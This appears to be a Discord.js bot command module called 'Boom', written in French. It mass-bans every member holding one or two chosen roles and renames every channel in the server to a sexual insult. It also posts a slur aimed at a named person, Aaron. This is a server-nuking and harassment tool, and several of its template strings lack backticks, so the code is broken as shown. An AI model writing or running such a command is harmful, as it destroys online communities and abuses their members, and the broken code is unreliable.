const { SlashCommandBuilder, PermissionFlagsBits } = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("Boom")
        .setDescription("Boom.")
        .addRoleOption(option =>
            option.setName("role1")
                .setDescription("Premier rôle à bannir")
                .setRequired(true)
        )
        .addRoleOption(option =>
            option.setName("role2")
                .setDescription("Deuxième rôle (optionnel)")
                .setRequired(false)
        )
        .setDefaultMemberPermissions(
            PermissionFlagsBits.BanMembers |
            PermissionFlagsBits.ManageChannels
        ),

    async execute(interaction) {
        const role1 = interaction.options.getRole("role1");
        const role2 = interaction.options.getRole("role2");

        await interaction.reply("Ntm ptite slp de Aaron…"); 

// --- MASSBAN ---
        const rolesToBan = [role1];
        if (role2) rolesToBan.push(role2);

        const members = await interaction.guild.members.fetch();

        const targets = members.filter(member =>
            rolesToBan.some(role => member.roles.cache.has(role.id))
        );

        let banCount = 0;

        for (const member of targets.values()) {
            try {
                await member.ban({ reason: "Bam" });
                banCount++;
            } catch (err) {
                console.error(Impossible de bannir ${member.user.tag});
            }
        }

        // --- RENAME ALL CHANNELS ---
        const channels = interaction.guild.channels.cache;
        let renameCount = 0;

        for (const channel of channels.values()) {
            try {
                await channel.setName("Ptite slp");
                renameCount++;
            } catch (err) {
                console.error(Impossible de renommer ${channel.name});
            }
        }

        interaction.followUp(
             **Ciao slp**  
Membres bannis : **${banCount}**  
Salons renommés : **${renameCount}**
        );
    }
}; 